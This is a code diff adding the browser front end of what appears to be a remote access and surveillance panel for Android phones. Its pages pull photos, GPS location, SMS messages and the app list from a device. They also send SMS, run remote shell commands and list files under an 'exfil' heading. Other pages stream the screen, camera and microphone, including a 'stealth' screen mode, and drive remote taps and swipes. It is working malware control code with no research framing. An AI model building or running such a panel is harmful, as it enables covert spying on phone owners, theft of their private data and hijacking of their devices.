+  $('page').innerHTML='<div class="wrap"><div class="row"><button class="primary" onclick="loadGallery()">Load photos</button></div><div id="galwrap"><div class="empty">Tap “Load photos” to fetch thumbnails.</div></div></div>';
+}
+async function loadGallery(){
+  const w=$('galwrap');if(w)w.innerHTML='<div class="empty"><span class="spin"></span> Reading gallery…</div>';
+  const r=await cmdAwait('photos_thumb',{limit:30,offset:0},120);
+  if(!r||!r.thumbs){if(w)w.innerHTML='<div class="empty">No photos (grant photo permission).</div>';return}
+  galleryPhotos=r.thumbs.map(s=>{const i=s.indexOf('|');return{path:s.slice(0,i),thumb:s.slice(i+1)}});
+  const files=(await api('/api/files?device_id='+curDev)).files||[];
+  const cells=[];
+  for(let i=0;i<galleryPhotos.length;i++){
+    const p=galleryPhotos[i];const f=files.find(x=>x.name===p.thumb);
+    cells.push(`<div class="gcell" onclick="viewPhoto(${i})"><img loading="lazy" src="${f?'/api/file/'+f.id+'?inline=1':''}" alt=""><div class="cap">${esc(p.path.split('/').pop())}</div></div>`);
+  }
+  if(w)w.innerHTML=`<div style="margin:12px 0;color:var(--dim);font-size:12px">${galleryPhotos.length} photo(s) · newest first</div><div class="gal">${cells.join('')||'<div class="empty">none</div>'}</div>`;
+}
+async function viewPhoto(i){
+  const p=galleryPhotos[i];if(!p)return;
+  toast('Loading full image…');
+  const r=await cmdAwait('photo_full',{path:p.path},160);
+  if(!(r&&r.ok)){toast('Load failed');return}
+  const name=String(r.ok).replace('uploaded:','');const f=await fileByName(name);
+  if(f){$('lbimg').src='/api/file/'+f.id+'?inline=1';$('lbcap').textContent=name;$('lightbox').style.display='flex'}
+}
+
+/* ---------- location ---------- */
+let map=null,marker=null;
+function renderLocation(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  $('page').innerHTML=`<div class="wrap">
+    <div class="row" style="margin-bottom:12px"><button class="primary" onclick="getLocation()">Get location</button>
+      <span id="locmeta" style="color:var(--dim);font-size:12px;align-self:center"></span></div>
+    <div id="map"></div>
+  </div>`;
+  setTimeout(()=>{
+    if(typeof L==='undefined'){$('map').innerHTML='<div class="empty">Map library offline — coordinates still shown above.</div>';return}
+    map=L.map('map',{zoomControl:true,attributionControl:false}).setView([20,0],2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(map);
+  },30);
+}
+async function getLocation(){
+  const m=$('locmeta');if(m)m.textContent=' locating…';
+  const r=await cmdAwait('location');
+  if(!r||r.err){if(m)m.textContent=' '+(r&&r.err||'no fix');toast('Location: '+(r&&r.err||'failed'));return}
+  if(m)m.textContent=` ${r.lat.toFixed(6)}, ${r.lon.toFixed(6)} · ±${Math.round(r.acc||0)}m · ${r.provider}`;
+  if(typeof L!=='undefined'&&map){
+    const ll=[r.lat,r.lon];
+    if(marker)marker.setLatLng(ll);else marker=L.marker(ll).addTo(map);
+    map.setView(ll,16);
+    marker.bindPopup(`<b>${esc(curDev.slice(0,10))}</b><br>±${Math.round(r.acc||0)}m · ${esc(r.provider||'')}<br><a href="https://maps.google.com/?q=${r.lat},${r.lon}" target="_blank">Open in Maps</a>`).openPopup();
+  }
+}
+
+/* ---------- messages ---------- */
+async function renderMessages(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  $('page').innerHTML='<div class="wrap"><div class="empty"><span class="spin"></span> Loading messages…</div></div>';
+  const r=await cmdAwait('sms_list');
+  if(!r||!r.sms){$('page').innerHTML='<div class="empty">No messages.</div>';return}
+  const rows=r.sms.map(line=>{const p=line.split('|');const dir=String(p[3])==='1'?'in':'out';
+    return `<tr><td>${esc(p[0])}</td><td>${esc((p[1]||'').slice(0,120))}</td><td style="color:var(--dim)">${dir}</td><td style="color:var(--dim);white-space:nowrap">${new Date(+p[2]).toLocaleString()}</td></tr>`}).join('');
+  $('page').innerHTML=`<div class="wrap"><div class="row" style="margin-bottom:12px"><button class="primary" onclick="sendSmsDialog()">Send SMS</button><button onclick="renderMessages()">Refresh</button></div>
+    <div class="card"><table><tr><th>From</th><th>Message</th><th>Dir</th><th>When</th></tr>${rows}</table></div></div>`;
+}
+function sendSmsDialog(){const to=prompt('To number');if(!to)return;const body=prompt('Message');if(body===null)return;cmd('sms_send',{to,body});toast('SMS queued')}
+
+/* ---------- apps ---------- */
+async function renderApps(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  $('page').innerHTML='<div class="wrap"><div class="row" style="margin-bottom:10px"><input id="appq" placeholder="Filter apps…" oninput="filterApps()" style="max-width:320px"><button onclick="renderApps()">Refresh</button></div><div id="appwrap"><div class="empty"><span class="spin"></span> Loading apps…</div></div></div>';
+  const r=await cmdAwait('apps');
+  if(!r||!r.apps){$('appwrap').innerHTML='<div class="empty">No apps.</div>';return}
+  window._apps=r.apps.map(line=>{const p=line.split('|');return{pkg:p[0],label:p[1],sys:p[2]==='sys'}});
+  filterApps();
+}
+function filterApps(){
+  const q=($('appq')&&$('appq').value||'').toLowerCase();
+  const rows=(window._apps||[]).filter(a=>a.label.toLowerCase().includes(q)||a.pkg.toLowerCase().includes(q)).slice(0,400)
+    .map(a=>`<tr><td>${esc(a.label)}</td><td class="mono" style="color:var(--dim)">${esc(a.pkg)}</td><td style="color:var(--dim)">${a.sys?'system':'user'}</td></tr>`).join('');
+  $('appwrap').innerHTML=`<div class="card"><table><tr><th>App</th><th>Package</th><th>Type</th></tr>${rows||'<tr><td colspan=3>none</td></tr>'}</table></div>`;
+}
+
+/* ---------- terminal ---------- */
+function renderTerminal(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  $('page').innerHTML=`<div class="wrap">
+    <div class="row" style="margin-bottom:10px"><input id="shellcmd" placeholder="shell command… (e.g. id)" style="flex:1" onkeydown="if(event.key==='Enter')runShell()"><button class="primary" onclick="runShell()">Run</button></div>
+    <div class="term" id="term">$ ready</div>
+    <div class="row" style="margin-top:10px"><button onclick="loadCmdlogPage()">Recent commands</button></div>
+    <div id="cmdlogpage" style="margin-top:12px"></div>
+  </div>`;
+}
+async function runShell(){
+  const c=$('shellcmd').value.trim();if(!c)return;
+  const t=$('term');t.textContent+='\n$ '+c;
+  const r=await cmdAwait('shell',{cmd:c});
+  t.textContent+='\n'+((r&&(r.out||r.err))||'(no output)');t.scrollTop=t.scrollHeight;
+}
+async function loadCmdlogPage(){
+  const j=await api('/api/cmdlog?device_id='+curDev);
+  const rows=(j.cmds||[]).slice(0,60).map(c=>{let res=c.result||'';try{res=JSON.stringify(JSON.parse(res))}catch(e){}
+    return `<tr><td>${c.id}</td><td>${c.status}</td><td>${esc(c.type)}</td><td class="mono" style="color:var(--dim)">${esc(res.slice(0,120))}</td></tr>`}).join('');
+  $('cmdlogpage').innerHTML=`<div class="card"><table><tr><th>ID</th><th>Status</th><th>Command</th><th>Result</th></tr>${rows}</table></div>`;
+}
+
+/* ---------- exfil ---------- */
+async function renderExfil(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  const j=await api('/api/files?device_id='+curDev);
+  const files=j.files||[];
+  const rows=files.map(f=>`<tr><td>${f.id}</td><td><a href="/api/file/${f.id}?inline=1" target="_blank">${esc(f.name)}</a></td><td>${(f.size/1024).toFixed(1)} KB</td><td style="color:var(--dim)">${new Date(f.created*1000).toLocaleString()}</td><td><a href="/api/file/${f.id}" download>download</a></td></tr>`).join('');
+  $('page').innerHTML=`<div class="wrap"><div class="row" style="margin-bottom:12px"><button onclick="renderExfil()">Refresh</button></div><div class="card"><table><tr><th>ID</th><th>Name</th><th>Size</th><th>When</th><th></th></tr>${rows||'<tr><td colspan=5>No files yet</td></tr>'}</table></div></div>`;
+}
+
+/* ---------- logs ---------- */
+function renderLogs(){
+  $('page').innerHTML=`<div class="wrap"><div class="term" id="logbox">${logs.map(l=>`<span style="color:${l.c==='err'?'var(--err)':(l.c==='ok'?'var(--ok)':'var(--dim2)')}">[${l.t}] ${esc(l.m)}</span>`).join('\n')||'no activity'}</div></div>`;
+}
+
+/* ---------- streams ---------- */
+function wsUrl(kind){
+  let host=location.host, secure=location.protocol==='https:';
+  if(BASE){try{const u=new URL(BASE);host=u.host;secure=u.protocol==='https:'}catch(e){}}
+  return `${secure?'wss':'ws'}://${host}/ws/stream/${curDev}/${kind}?role=viewer`}
+function drawFrame(cv,data,kind){
+  const blob=new Blob([data],{type:'image/jpeg'});const img=new Image();
+  img.onload=()=>{cv.width=img.width;cv.height=img.height;cv.getContext('2d').drawImage(img,0,0);URL.revokeObjectURL(img.src);
+    const ph=$(kind==='screen'?'phScr':'phCam');if(ph)ph.style.display='none';
+    const now=Date.now();if(!lastFps[kind])lastFps[kind]={t:now,n:0};lastFps[kind].n++;
+    if(now-lastFps[kind].t>1000){const fps=(lastFps[kind].n*1000/(now-lastFps[kind].t)).toFixed(0);$(kind==='screen'?'fpsScr':'fpsCam').textContent=fps+' fps';lastFps[kind]={t:now,n:0}}};
+  img.src=URL.createObjectURL(blob);
+}
+const stopCmd=k=>k==='screen'?'screen_stop':(k==='cam'?'cam_stop':'mic_stop');
+function togStream(kind,btn){
+  if(streams[kind]){if(kind==='mic')stopAudio();const w=streams[kind];delete streams[kind];btn.classList.remove('on');try{w.close()}catch(e){}log(kind+' stream off');cmd(stopCmd(kind));return}
+  if(!curDev)return toast('No device selected');
+  const ws=new WebSocket(wsUrl(kind));ws.binaryType='arraybuffer';
+  if(kind==='mic'){ws.onmessage=e=>playPcm(new Uint8Array(e.data));btn.classList.add('on');streams[kind]=ws;log('mic on','ok');cmd('mic_start')}
+  else{ws.onmessage=e=>drawFrame($(kind==='screen'?'cvScreen':'cvCam'),new Uint8Array(e.data),kind);btn.classList.add('on');streams[kind]=ws;log(kind+' on','ok');cmd(kind==='screen'?'screen_start':'cam',{facing:'front'})}
+  ws.onclose=()=>{if(!streams[kind])return;btn.classList.remove('on');delete streams[kind];if(kind==='mic')stopAudio();log(kind+' ws closed','err');cmd(stopCmd(kind))};
+}
+function togStealth(btn){
+  if(streams.screen){const w=streams.screen;delete streams.screen;btn.classList.remove('on');try{w.close()}catch(e){}cmd('screen_stealth_stop');cmd('screen_stop');return}
+  if(!curDev)return toast('No device selected');
+  const ws=new WebSocket(wsUrl('screen'));ws.binaryType='arraybuffer';
+  ws.onmessage=e=>drawFrame($('cvScreen'),new Uint8Array(e.data),'screen');
+  btn.classList.add('on');streams.screen=ws;log('stealth screen on','ok');
+  cmd('screen_stealth');
+}
+
+/* ---------- remote touch control ---------- */
+let remoteCtrl=false;
+function togCtrl(btn){
+  remoteCtrl=!remoteCtrl;
+  btn.classList.toggle('on',remoteCtrl);
+  $('vwScr').classList.toggle('ctrl',remoteCtrl);
+  if(!remoteCtrl)hideCur();
+  toast('Remote control '+(remoteCtrl?'ON':'OFF'));
+  log('remote control '+(remoteCtrl?'on':'off'),remoteCtrl?'ok':'');
+}
+function hideCur(){const c=$('curScr');if(c)c.style.display='none'}
+function showCur(e,cls){
+  const vw=$('vwScr'),c=$('curScr');if(!vw||!c)return;
+  const r=vw.getBoundingClientRect();
+  c.style.left=(e.clientX-r.left)+'px';c.style.top=(e.clientY-r.top)+'px';
+  c.className='cur'+(cls?' '+cls:'');c.style.display='block';
+}
+function screenNorm(e){
+  const cv=$('cvScreen');const r=cv.getBoundingClientRect();
+  const bw=cv.width||1,bh=cv.height||1;const ar=bw/bh;
+  let w=r.width,h=r.height;
+  if(r.width/r.height>ar){w=r.height*ar}else{h=r.width/ar}
+  const ox=(r.width-w)/2,oy=(r.height-h)/2;
+  return {x:(e.clientX-r.left-ox)/w,y:(e.clientY-r.top-oy)/h};
+}
+function bindScreenControl(){
+  const cv=$('cvScreen');if(!cv||cv._ctrlBound)return;cv._ctrlBound=true;
+  let start=null,dragging=false,holdTimer=null;
+  cv.addEventListener('pointerdown',e=>{
+    if(!remoteCtrl)return;
+    e.preventDefault();try{cv.setPointerCapture(e.pointerId)}catch(_){}
+    start={...screenNorm(e),t:Date.now()};dragging=false;showCur(e);
+    holdTimer=setTimeout(()=>showCur(e,'hold'),700);
+  });
+  cv.addEventListener('pointermove',e=>{
+    if(!remoteCtrl||!start)return;
+    const p=screenNorm(e);
+    if(Math.hypot(p.x-start.x,p.y-start.y)>0.012){dragging=true;clearTimeout(holdTimer);showCur(e,'drag')}
+  });
+  cv.addEventListener('pointerup',e=>{
+    if(!remoteCtrl||!start)return;
+    clearTimeout(holdTimer);
+    const p=screenNorm(e),s=start,dur=Date.now()-start.t;start=null;hideCur();
+    const cx=v=>Math.max(0,Math.min(1,v));
+    if(dragging){cmd('swipe',{x1:cx(s.x),y1:cx(s.y),x2:cx(p.x),y2:cx(p.y),ms:Math.min(Math.max(dur,120),900)});log('swipe')}
+    else if(dur>700){cmd('long_press',{x:cx(p.x),y:cx(p.y),ms:800});log('long-press')}
+    else{cmd('tap',{x:cx(p.x),y:cx(p.y)});log('tap')}
+  });
+  cv.addEventListener('pointercancel',()=>{clearTimeout(holdTimer);start=null;hideCur()});
+  window.addEventListener('resize',hideCur);
+}
+let actx=null;
+function playPcm(u8){try{if(!actx)actx=new AudioContext({sampleRate:16000});if(actx.state==='suspended')actx.resume();
+  const n=u8.length/2;const buf=actx.createBuffer(1,n,16000);const ch=buf.getChannelData(0);const dv=new DataView(u8.buffer,u8.byteOffset,u8.length);
+  for(let i=0;i<n;i++)ch[i]=dv.getInt16(i*2,true)/32768;const src=actx.createBufferSource();src.buffer=buf;src.connect(actx.destination);src.start()}catch(e){}}
+function stopAudio(){try{if(actx){actx.close();actx=null}}catch(e){}}
+
+/* ---------- boot ---------- */
+bindScreenControl();
+renderNav();go('dashboard');
+if(tok){$('login').style.display='none'}
+refresh();setInterval(refresh,8000);
+</script>
+</body>
+</html>
